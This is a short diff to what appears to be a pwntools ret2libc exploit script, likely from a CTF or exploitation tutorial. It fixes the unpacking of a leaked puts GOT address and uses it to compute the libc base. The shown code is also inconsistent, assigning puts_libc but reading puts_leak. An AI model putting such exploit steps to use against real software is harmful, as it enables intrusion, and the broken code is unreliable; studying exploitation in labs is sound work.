@@ -59,7 +59,7 @@ p.sendline(payload)
 
 p.recvline()                    # This is the 'Hello, <>!' string - we don't need this
 
-puts_libc = p.recv(4)           # The puts call. We only need the first 4 bytes (the GOT entry of puts)
+puts_libc = u32(p.recv(4))      # The puts call. We only need the first 4 bytes (the GOT entry of puts)
 log.success(f'Puts@LIBC: {hex(puts_libc)}')
 
 libc.address = puts_leak - libc.symbols['puts']
